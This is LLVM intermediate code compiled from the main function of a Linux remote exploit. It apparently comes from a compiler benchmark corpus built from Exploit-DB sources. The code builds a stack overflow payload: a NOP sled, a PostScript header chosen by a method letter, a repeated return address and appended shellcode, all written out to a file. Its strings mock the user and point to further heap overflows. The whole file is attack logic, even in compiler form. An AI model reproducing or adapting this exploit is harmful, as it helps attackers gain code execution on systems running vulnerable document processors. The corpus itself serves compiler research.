; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_400.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_400.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BS = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [50 x i8] c"Usage: %s < retaddr > < ownage method c b o p r>\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [4 x i8] c"%lx\00", align 1
@NOP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [6 x i8] c"%s\0A%s\00", align 1
@PS_COMMENT = common dso_local global i8* null, align 8
@BOUND_BOX = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@ORIENTATION = common dso_local global i8* null, align 8
@PAGES = common dso_local global i8* null, align 8
@PAGE_ORDER = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [270 x i8] c"Cmon man pick a funkin method!!\0Aoh i see, 5 is not enough to choose from??\0Adon't worry, there are more, just read the source to find them\0Aok fine, you don't want to overflow the stack, understandable.\0Athere are also some heap overflows you picky bastard\0Agrep -n sscanf\0A\00", align 1
@RETADDR_BYTES = common dso_local global i32 0, align 4
@NNOPS = common dso_local global i64 0, align 8
@remote = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@OUTFILE = common dso_local global i32 0, align 4
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [5 x i8] c"open\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"write\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i8, align 1
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @BS, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %9, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %10, align 8
  store i8 0, i8* %11, align 1
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 3
  br i1 %19, label %20, label %27

20:                                               ; preds = %2
  %21 = load i32, i32* @stderr, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @fprintf(i32 %21, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str, i64 0, i64 0), i8* %24)
  %26 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %26, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %157

27:                                               ; preds = %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @sscanf(i8* %30, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i32* %12)
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 0
  %36 = load i8, i8* %35, align 1
  store i8 %36, i8* %11, align 1
  %37 = load i32, i32* @NOP, align 4
  %38 = load i32, i32* @BS, align 4
  %39 = call i32 @memset(i8* %17, i32 %37, i32 %38)
  %40 = load i8, i8* %11, align 1
  %41 = sext i8 %40 to i32
  %42 = icmp eq i32 %41, 98
  br i1 %42, label %43, label %49

43:                                               ; preds = %27
  %44 = load i32, i32* @BS, align 4
  %45 = sub nsw i32 %44, 1
  %46 = load i8*, i8** @PS_COMMENT, align 8
  %47 = load i8*, i8** @BOUND_BOX, align 8
  %48 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %17, i32 %45, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8* %46, i8* %47)
  store i32 %48, i32* %6, align 4
  br label %95

49:                                               ; preds = %27
  %50 = load i8, i8* %11, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp eq i32 %51, 99
  br i1 %52, label %53, label %58

53:                                               ; preds = %49
  %54 = load i32, i32* @BS, align 4
  %55 = sub nsw i32 %54, 1
  %56 = load i8*, i8** @PS_COMMENT, align 8
  %57 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %17, i32 %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %56)
  store i32 %57, i32* %6, align 4
  br label %94

58:                                               ; preds = %49
  %59 = load i8, i8* %11, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 111
  br i1 %61, label %62, label %68

62:                                               ; preds = %58
  %63 = load i32, i32* @BS, align 4
  %64 = sub nsw i32 %63, 1
  %65 = load i8*, i8** @PS_COMMENT, align 8
  %66 = load i8*, i8** @ORIENTATION, align 8
  %67 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %17, i32 %64, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8* %65, i8* %66)
  store i32 %67, i32* %6, align 4
  br label %93

68:                                               ; preds = %58
  %69 = load i8, i8* %11, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp eq i32 %70, 112
  br i1 %71, label %72, label %78

72:                                               ; preds = %68
  %73 = load i32, i32* @BS, align 4
  %74 = sub nsw i32 %73, 1
  %75 = load i8*, i8** @PS_COMMENT, align 8
  %76 = load i8*, i8** @PAGES, align 8
  %77 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %17, i32 %74, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8* %75, i8* %76)
  store i32 %77, i32* %6, align 4
  br label %92

78:                                               ; preds = %68
  %79 = load i8, i8* %11, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 114
  br i1 %81, label %82, label %88

82:                                               ; preds = %78
  %83 = load i32, i32* @BS, align 4
  %84 = sub nsw i32 %83, 1
  %85 = load i8*, i8** @PS_COMMENT, align 8
  %86 = load i8*, i8** @PAGE_ORDER, align 8
  %87 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %17, i32 %84, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8* %85, i8* %86)
  store i32 %87, i32* %6, align 4
  br label %91

88:                                               ; preds = %78
  %89 = call i32 @printf(i8* getelementptr inbounds ([270 x i8], [270 x i8]* @.str.4, i64 0, i64 0))
  %90 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %90, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %157

91:                                               ; preds = %82
  br label %92

92:                                               ; preds = %91, %72
  br label %93

93:                                               ; preds = %92, %62
  br label %94

94:                                               ; preds = %93, %53
  br label %95

95:                                               ; preds = %94, %43
  store i32 0, i32* %7, align 4
  br label %96

96:                                               ; preds = %109, %95
  %97 = load i32, i32* %7, align 4
  %98 = load i32, i32* @RETADDR_BYTES, align 4
  %99 = sub nsw i32 %98, 3
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %114

101:                                              ; preds = %96
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %17, i64 %103
  %105 = load i32, i32* %6, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  %108 = call i32 @memcpy(i8* %107, i32* %12, i32 4)
  br label %109

109:                                              ; preds = %101
  %110 = load i32, i32* %7, align 4
  %111 = sext i32 %110 to i64
  %112 = add i64 %111, 4
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %7, align 4
  br label %96

114:                                              ; preds = %96
  %115 = load i32, i32* %7, align 4
  %116 = sext i32 %115 to i64
  %117 = load i64, i64* @NNOPS, align 8
  %118 = add nsw i64 %116, %117
  %119 = load i32, i32* %6, align 4
  %120 = sext i32 %119 to i64
  %121 = add nsw i64 %120, %118
  %122 = trunc i64 %121 to i32
  store i32 %122, i32* %6, align 4
  %123 = load i32, i32* %6, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8, i8* %17, i64 %124
  %126 = load i32, i32* @remote, align 4
  %127 = call i32 @strcpy(i8* %125, i32 %126)
  %128 = load i32, i32* %6, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %17, i64 %129
  %131 = call i32 @strcat(i8* %130, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %132 = load i32, i32* @remote, align 4
  %133 = call i64 @strlen(i32 %132)
  %134 = add nsw i64 %133, 2
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = add nsw i64 %136, %134
  %138 = trunc i64 %137 to i32
  store i32 %138, i32* %6, align 4
  %139 = load i32, i32* @OUTFILE, align 4
  %140 = load i32, i32* @O_RDWR, align 4
  %141 = load i32, i32* @O_CREAT, align 4
  %142 = or i32 %140, %141
  %143 = call i32 @open(i32 %139, i32 %142, i32 438)
  store i32 %143, i32* %8, align 4
  %144 = icmp slt i32 %143, 0
  br i1 %144, label %145, label %147

145:                                              ; preds = %114
  %146 = call i32 @die(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  br label %147

147:                                              ; preds = %145, %114
  %148 = load i32, i32* %8, align 4
  %149 = load i32, i32* %6, align 4
  %150 = call i64 @write(i32 %148, i8* %17, i32 %149)
  %151 = icmp slt i64 %150, 0
  br i1 %151, label %152, label %154

152:                                              ; preds = %147
  %153 = call i32 @die(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  br label %154

154:                                              ; preds = %152, %147
  %155 = load i32, i32* %8, align 4
  %156 = call i32 @close(i32 %155)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %157

157:                                              ; preds = %154, %88, %20
  %158 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %158)
  %159 = load i32, i32* %3, align 4
  ret i32 %159
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

declare dso_local i32 @sscanf(i8*, i8*, i32*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, ...) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @memcpy(i8*, i32*, i32) #2

declare dso_local i32 @strcpy(i8*, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i64 @strlen(i32) #2

declare dso_local i32 @open(i32, i32, i32) #2

declare dso_local i32 @die(i8*) #2

declare dso_local i64 @write(i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
